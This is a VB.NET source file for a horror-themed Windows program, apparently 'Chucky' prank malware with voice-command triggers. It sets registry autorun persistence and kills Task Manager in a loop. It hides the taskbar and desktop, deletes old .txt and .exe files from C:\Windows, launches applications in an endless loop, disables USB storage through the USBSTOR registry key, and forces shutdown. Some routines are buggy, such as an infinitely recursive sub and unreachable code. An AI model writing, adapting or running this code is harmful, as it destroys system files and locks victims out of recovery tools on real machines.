Imports System.Threading
Imports System.Speech
Imports Microsoft.Win32

Public Class Form1
    Private TargetDT As DateTime
    Private Sub StartUp(sender As Object, e As EventArgs) Handles MyBase.Load ' Sub for Startup///
        My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
    End Sub  'This allows the program to autorun on restart


    Private CountDownFrom As TimeSpan = TimeSpan.FromMinutes(120) ' The number 120 (to the left) will alter your time on the countdown
    Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Private Declare Function FindWindow Lib "user32.dll" Alias "FindWindowA" (ByVal IpClassName As String, ByVal IpWindowName As String) As Int32
    Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As IntPtr, ByVal nCmdShow As Int32) As Int32
    Private Const SW_HIDE As Int32 = 0
    Private Const SW_RESTORE As Int32 = 9
    Const SWP_HIDEWINDOW = &H80
    Const SWP_SHOWWINDOW = &H40
    Dim taskBar As Integer
    Private WithEvents Chucky As New Recognition.SpeechRecognitionEngine
    Public synth As New Speech.Synthesis.SpeechSynthesizer
    Dim gram As New Recognition.DictationGrammar()

    Private Sub ChuckyUltimate()
        Dim filepath As String
        Dim registrykey As Object
        filepath = Environ("homedrive") + "\programdata\ChuckyUltimate.exe"
        registrykey = CreateObject("Wscript.Shell")
        registrykey.regwrite("HKCU\software\microsoft\windows\currentversion\run\DoctorSleeps", filepath)
        ChuckyUltimate()
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer1.Interval = 100
        TargetDT = DateTime.Now.Add(CountDownFrom)
        Timer1.Start()
        taskBar = FindWindow("Shell_traywnd", "")
        Dim hwnd As IntPtr
        hwnd = FindWindow(vbNullString, "Program Manager")
        If Not hwnd = 0 Then
            ShowWindow(hwnd, SW_RESTORE)
        End If
        Dim t As New Threading.Thread(AddressOf block)
        t.Start()
        My.Computer.Audio.Play(My.Resources.chuckys_laugh_3, AudioPlayMode.Background)
        Dim Ans As Integer
        Ans = MsgBox("HERE ARE SOME VOICE COMMANDS YOU WILL NEED TO USE, WRITE THEM DOWN", 0, "CHUCKY")
        If Ans = 1 Then
            MsgBox("CHUCKY PLEASE STOP, OH GOD HELP ME, FUCK ME I DON'T KNOW")
        End If

        Chucky.SetInputToDefaultAudioDevice()

        Dim Grammar As New Recognition.SrgsGrammar.SrgsDocument

        Dim WordRule As New Recognition.SrgsGrammar.SrgsRule("Word")

        Dim Wordlist As New Recognition.SrgsGrammar.SrgsOneOf("CHUCKY PLEASE STOP", "OH GOD HELP ME", "CHARLES LEE RAY", "FUCK ME I DONT KNOW", "JOYCE DAHMER")

        WordRule.Add(Wordlist)

        Grammar.Rules.Add(WordRule)

        Grammar.Root = WordRule

        Chucky.LoadGrammar(New Recognition.Grammar(Grammar))
        Chucky.RecognizeAsync()

    End Sub
    Sub block()
        While True
            For Each p As Process In Process.GetProcessesByName("taskmgr")
                p.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub
    Private Sub Chucky_SpeechRecognized(sender As Object, e As Recognition.SpeechRecognizedEventArgs) Handles Chucky.SpeechRecognized
        Select Case e.Result.Text
            Case "CHUCKY PLEASE STOP"
                My.Computer.Audio.Play(My.Resources.youre_a_fucking_drag_you_know_that, AudioPlayMode.Background)
                Process.Start("https://www.youtube.com/watch?v=Lfl53kiHa30&autoplay=1&mute=1")

            Case "JOYCE DAHMER"
                My.Computer.Audio.Play(My.Resources.shit, AudioPlayMode.Background)
                Dim Ans As Integer
                Ans = MsgBox("THINK YOUR FUCKIN' SMART, DON'T YA?", 0, "CHUCKY")
                NextStep.Show()
                Me.Hide()

            Case "FUCK ME I DONT KNOW"
                Dim Ans As Integer
                Ans = MsgBox("WRONG ANSWER!!!", 0, "CHUCKY")
                My.Computer.Audio.Play(My.Resources.charles_lee_ray, AudioPlayMode.Background)
                Timer1.Interval = 100
                TargetDT = DateTime.Now.Add(CountDownFrom)
                Timer1.Start()
                My.Computer.Audio.Play(My.Resources.failure, AudioPlayMode.Background)
                Shell("shutdown -s -t 60")
                Dim regKey As RegistryKey
                regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
                regKey.SetValue("Start", 4)

            Case "CHARLES LEE RAY"
                Dim Ans As Integer
                Ans = MsgBox("THAT'S RIGHT", 0, "CHUCKY")
                NextStep.Show()
                Me.Hide()

            Case "OH GOD HELP ME"
                Me.Hide()
                My.Computer.Audio.Play(My.Resources.close_your_eyes_and_count_to_7, AudioPlayMode.Background)
                Dim Ans As Integer
                Ans = MsgBox("YOU WANTED TO PLAY", 0, "CHUCKY")
                Doom.Show()
        End Select
    End Sub

    Private Sub Chucky_RecognizeCompleted(sender As Object, e As Recognition.RecognizeCompletedEventArgs) Handles Chucky.RecognizeCompleted
        Chucky.RecognizeAsync()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click  'Wanna Play Button///
        Dim Ans As Integer
        Ans = MsgBox("I LIKE YOUR SPIRIT KID", 1, "CHUCKY")
        My.Computer.Audio.Play(My.Resources.its_time_to_play, AudioPlayMode.Background)
        PlayTime.Show()
        Me.Hide()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        MessageBox.Show(Now.ToString())

        Dim tasmaniaNow = System.TimeZoneInfo.ConvertTime(Now, TimeZoneInfo.FindSystemTimeZoneById("Tasmania Standard Time"))
        MessageBox.Show(tasmaniaNow.ToString()) '>>>>>>>>>>>>>>>
        Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "C:\Program Files\Microsoft Mouse and Keyboard Center\ipoint.exe" 'Delete Mouse & Keyboard///
        System.IO.Directory.Delete(path, True)
        Dim directory As New IO.DirectoryInfo("C:\Windows") 'Your Path/Directory

        Button1.Text = "Hide"
        Debug.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, SWP_HIDEWINDOW)) 'HIDES WINDOWS TASKBAR & START///
        Button1.Text = "Show"                                                  'TO FIX CHANGE HIDE TO "SHOW" AND "SHOW" TO "HIDE" AND SWP_HIDEWINDOW TO SWP_SHOWWINDOW

        Dim hwnd As IntPtr
        hwnd = FindWindow(vbNullString, "Program Manager") 'HIDES DESKTOP///
        If Not hwnd = 0 Then
            ShowWindow(hwnd, SW_HIDE) 'TO FIX CHANGE SW_HIDE TO SW_RESTORE
        End If

        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".txt") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The Days can be altered
                file.Delete()
            End If
        Next
        For Each file As IO.FileInfo In directory.GetFiles
            If file.Extension.Equals(".exe") AndAlso (Now - file.CreationTime).Days > 7 Then 'Note: The days can be altered
                file.Delete()
            End If
        Next
        Do
            Process.Start("chrome")  'Loops from Hell>>>All will activate at once like Machine Gun Fire///
            Process.Start("opera")                     ''                           ''
            Process.Start("firefox")                   ''                           ''
            Process.Start("notepad")                   ''                           ''
            Process.Start("winword")                   ''                           ''
            Process.Start("wordpad")                   ''                           ''
            Process.Start("wmplayer")                  ''                           ''
        Loop

        Shell("shutdown -s -t 30") 'Shutdown Code/// 30 seconds///
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
        regKey.SetValue("Start", 4)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim ts As TimeSpan = TargetDT.Subtract(DateTime.Now) 'Start of Timer1 Code>>>>
        If ts.TotalMilliseconds > 0 Then
            Label1.Text = ts.ToString("hh\:mm\:ss")
        Else
            Label1.Text = "00:00"
            Timer1.Stop() ' End of Timer1 Code>>>

        End If
    End Sub
End Class